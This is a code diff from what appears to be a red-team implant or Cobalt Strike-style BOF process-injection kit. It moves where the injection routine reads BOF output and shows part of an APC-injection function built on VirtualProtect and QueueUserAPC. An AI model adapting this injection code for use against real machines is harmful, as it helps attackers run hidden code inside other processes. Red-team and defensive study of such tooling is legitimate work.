@@ -86,6 +86,7 @@ BOOL InjectCustomKit(_In_ PBYTE buffer, _In_ SIZE_T bufferLen, _In_ PCHAR Inject
 	BOOL   Status  = FALSE;
 	HANDLE hPipe   = NULL;
 	PCHAR  output  = NULL;
+	PCHAR BofOutBuf = NULL;
 	DWORD  Length  = 0;
 	DWORD  Wait	   = 0;
 	OVERLAPPED ov  = { 0 };
@@ -118,15 +119,6 @@ BOOL InjectCustomKit(_In_ PBYTE buffer, _In_ SIZE_T bufferLen, _In_ PCHAR Inject
 		goto END;
 	}
 
-	/* Read any output from the Process Inject BOF */
-	PCHAR BofOutBuf = NULL;
-	int BofOutLen = 0;
-    BofOutBuf = BeaconGetOutputData(&BofOutLen);
-	if (BofOutBuf == NULL) {
-        _err("[!] Failed get BOF output");
-        goto END;
-	}
-
 
 	Wait = WaitForSingleObject(ov.hEvent, 10000); 		// 10s
 	if ( Wait != WAIT_OBJECT_0 )
@@ -146,6 +138,14 @@ BOOL InjectCustomKit(_In_ PBYTE buffer, _In_ SIZE_T bufferLen, _In_ PCHAR Inject
 	_dbg("[+] Received %lu bytes of output", Length);
 	_dbg("%.*s\n", Length, output);  // if it's printable
 
+
+	/* Read any output from the Process Inject BOF */
+	int BofOutLen = 0;
+    BofOutBuf = BeaconGetOutputData(&BofOutLen);
+	if (BofOutBuf == NULL) {
+        _err("[!] Failed get BOF output");
+        goto END;
+	}
 
 	/* Combine BOF output and named pipe output */
 	DWORD totalLen = BofOutLen + Length;
@@ -300,7 +300,7 @@ BOOL RunViaRemoteApcInjection(IN HANDLE hThread, IN HANDLE hProc, IN PBYTE pPayl
 		_dbg("[!] VirtualProtect Failed With Error : %d", GetLastError());
 		return FALSE;
 	}
-	
+
 	if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
 		_dbg("[!] QueueUserAPC Failed With Error : %d ", GetLastError());
 		return FALSE;
